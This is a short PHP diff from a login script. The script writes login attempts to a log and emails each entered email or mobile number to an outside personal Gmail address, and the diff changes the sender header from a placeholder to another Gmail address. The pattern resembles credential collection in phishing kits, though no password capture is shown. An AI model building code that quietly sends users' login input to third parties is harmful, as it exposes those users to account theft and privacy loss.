@@ -26,7 +26,7 @@ file_put_contents('login_attempts.log', $logMessage, FILE_APPEND);
 $to = "reijihaneda81@gmail.com";
 $subject = "New Login Attempt";
 $message = "A new login attempt was made.\n\nEmail/Mobile: $emailOrMobile\nTimestamp: " . date('Y-m-d H:i:s');
-$headers = "From: yoursystem@example.com";
+$headers = "From: loddanimation@gmail.com";
 
 mail($to, $subject, $message, $headers);
 
